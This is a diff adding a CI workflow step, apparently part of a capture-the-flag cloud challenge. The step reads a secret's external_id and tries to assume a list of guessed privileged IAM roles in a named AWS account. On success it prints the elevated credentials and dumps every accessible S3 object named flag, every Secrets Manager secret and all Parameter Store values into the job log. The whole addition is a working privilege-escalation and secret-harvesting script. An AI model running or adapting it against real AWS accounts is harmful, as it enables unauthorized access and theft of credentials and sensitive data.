@@ -122,3 +122,91 @@ jobs:
           echo "Secret is not in JSON format:"
           echo "$SECRET_VALUE"
         fi
+        
+    - name: Search for roles using external_id
+      run: |
+        SECRET_VALUE=$(aws secretsmanager get-secret-value \
+          --secret-id "internal/secrets/id-v2" \
+          --query SecretString \
+          --output text)
+        
+        EXTERNAL_ID=$(echo "$SECRET_VALUE" | jq -r '.external_id')
+        echo "Using external_id: $EXTERNAL_ID"
+        
+        # Try to list IAM roles to find potential targets
+        echo "=== Searching for IAM roles ==="
+        aws iam list-roles --query 'Roles[?contains(RoleName, `privilege`) || contains(RoleName, `admin`) || contains(RoleName, `elevated`) || contains(RoleName, `secret`)].[RoleName,Arn]' --output table || echo "Cannot list roles"
+        
+        # Common role naming patterns that might require external_id
+        POTENTIAL_ROLES=(
+          "arn:aws:iam::170974506515:role/privileged-access-role"
+          "arn:aws:iam::170974506515:role/admin-role"
+          "arn:aws:iam::170974506515:role/elevated-access-role"
+          "arn:aws:iam::170974506515:role/secret-access-role"
+          "arn:aws:iam::170974506515:role/cross-account-role"
+          "arn:aws:iam::170974506515:role/external-role"
+          "arn:aws:iam::170974506515:role/high-privilege-role"
+          "arn:aws:iam::170974506515:role/vault-access-role"
+          "arn:aws:iam::170974506515:role/sensitive-data-role"
+        )
+        
+        for ROLE_ARN in "${POTENTIAL_ROLES[@]}"; do
+          echo "Attempting to assume role: $ROLE_ARN with external_id"
+          
+          ELEVATED_CREDS=$(aws sts assume-role \
+            --role-arn "$ROLE_ARN" \
+            --role-session-name "ElevatedAccess" \
+            --external-id "$EXTERNAL_ID" \
+            --output json 2>/dev/null)
+          
+          if [ $? -eq 0 ]; then
+            echo "✅ Successfully assumed role: $ROLE_ARN"
+            echo "$ELEVATED_CREDS" | jq .
+            
+            # Export new credentials
+            export AWS_ACCESS_KEY_ID=$(echo "$ELEVATED_CREDS" | jq -r '.Credentials.AccessKeyId')
+            export AWS_SECRET_ACCESS_KEY=$(echo "$ELEVATED_CREDS" | jq -r '.Credentials.SecretAccessKey')
+            export AWS_SESSION_TOKEN=$(echo "$ELEVATED_CREDS" | jq -r '.Credentials.SessionToken')
+            
+            echo "New identity with elevated role:"
+            aws sts get-caller-identity
+            
+            # Search for flags with elevated permissions
+            echo "=== Searching for flags with elevated permissions ==="
+            
+            # Check S3 buckets
+            echo "--- S3 Buckets ---"
+            aws s3 ls 2>/dev/null || echo "No S3 access"
+            
+            # Check for any accessible S3 objects
+            for bucket in $(aws s3 ls | awk '{print $3}' 2>/dev/null); do
+              echo "Checking bucket: $bucket"
+              aws s3 ls s3://$bucket/ --recursive | grep -i flag || true
+              # Try to get any flag files
+              aws s3 cp s3://$bucket/flag.txt - 2>/dev/null || true
+              aws s3 cp s3://$bucket/flag - 2>/dev/null || true
+              aws s3 cp s3://$bucket/FLAG - 2>/dev/null || true
+            done
+            
+            # Check additional secrets
+            echo "--- Additional Secrets ---"
+            aws secretsmanager list-secrets 2>/dev/null | jq -r '.SecretList[].Name' | while read secret_name; do
+              echo "Checking secret: $secret_name"
+              aws secretsmanager get-secret-value --secret-id "$secret_name" --query SecretString --output text 2>/dev/null || true
+            done
+            
+            # Check Parameter Store
+            echo "--- Parameter Store ---"
+            aws ssm describe-parameters 2>/dev/null || echo "No parameter store access"
+            aws ssm get-parameters-by-path --path "/" --recursive 2>/dev/null | jq -r '.Parameters[].Value' || true
+            
+            # Check DynamoDB tables
+            echo "--- DynamoDB Tables ---"
+            aws dynamodb list-tables 2>/dev/null || echo "No DynamoDB access"
+            
+            # Break after first successful role assumption
+            break
+          else
+            echo "❌ Failed to assume role: $ROLE_ARN"
+          fi
+        done
